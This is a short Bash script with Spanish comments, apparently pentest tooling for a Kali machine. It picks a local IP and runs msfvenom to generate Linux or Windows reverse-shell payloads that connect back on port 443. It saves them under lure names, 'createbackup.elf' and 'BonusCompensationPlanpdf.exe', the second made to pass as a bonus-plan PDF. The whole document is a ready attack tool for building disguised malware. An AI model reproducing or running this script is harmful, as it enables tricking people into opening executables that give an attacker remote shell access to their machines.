#!/usr/bin/env bash

# Obtener IPs disponibles y filtrar vacíos
mapfile -t IPS < <(hostname -I | tr ' ' '\n' | grep -v '^$')

echo "--- IPs Disponibles ---"
for i in "${!IPS[@]}"; do
    echo "$((i+1)). ${IPS[$i]}"
done

# Selección de IP
read -p "Selecciona el número de la IP: " IP_CHOICE
KALI_IP=${IPS[$((IP_CHOICE-1))]}

if [ -z "$KALI_IP" ]; then
    echo "Selección inválida."
    exit 1
fi

echo "IP seleccionada: $KALI_IP"
echo "-----------------------"

# Selección de OS
echo "Elige el sistema operativo target:"
echo "1. Linux (x64)"
echo "2. Windows"
read -p "Selección [1-2]: " OS_CHOICE

case $OS_CHOICE in
    1)
        echo "Generando payload Linux..."
        msfvenom -p linux/x64/shell_reverse_tcp LHOST="$KALI_IP" LPORT=443 -f elf > createbackup.elf
        echo "Archivo creado: createbackup.elf"
        ;;
    2)
        echo "Generando payload Windows..."
        msfvenom -p windows/shell_reverse_tcp LHOST="$KALI_IP" LPORT=443 -f exe > BonusCompensationPlanpdf.exe
        echo "Archivo creado: BonusCompensationPlanpdf.exe"
        ;;
    *)
        echo "Opción no válida."
        exit 1
        ;;
esac
